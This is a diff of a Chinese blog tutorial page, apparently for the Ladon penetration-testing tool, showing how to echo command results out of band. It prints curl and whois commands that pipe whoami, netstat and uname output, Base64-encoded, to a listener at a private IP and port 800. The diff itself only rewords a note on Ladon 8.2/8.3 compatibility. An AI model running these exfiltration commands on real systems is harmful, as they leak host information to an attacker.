@@ -210,10 +210,9 @@
 
 <h4 id="Base64回显-1"><a href="#Base64回显-1" class="headerlink" title="Base64回显"></a>Base64回显</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.250.21:800/deb64/`whoami|base64`</span><br></pre></td></tr></table></figure>
 
-<p>合并成一行，但是Ladon 8.2前的回显第行多一个-（而-符号是必须的），导致无法解密</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.250.21:800/deb64/`netstat -an|base64|tr <span class="string">'\n'</span> <span class="string">'-'</span>`</span><br></pre></td></tr></table></figure>
 
-<p>所以回显的一整行，需先替换-符号后才能解密，Ladon 8.3已支持</p>
+<p>PS：Base64回显会多出-符号，导致8.2无法解密，Ladon 8.3已完美兼容</p>
 <h3 id="Whois回显"><a href="#Whois回显" class="headerlink" title="Whois回显"></a>Whois回显</h3><p>Ladon 8.3的Web或Gui版的NC均可回显，无论是否BASE64加密，Ladon均可完美支持</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># whois -h 192.168.250.27 -p 800 `uname -a|base64`</span></span><br><span class="line">Timeout.</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop<span class="comment"># whois -h 192.168.250.27 -p 800 `uname -a`</span></span><br><span class="line">Timeout.</span><br></pre></td></tr></table></figure>
 
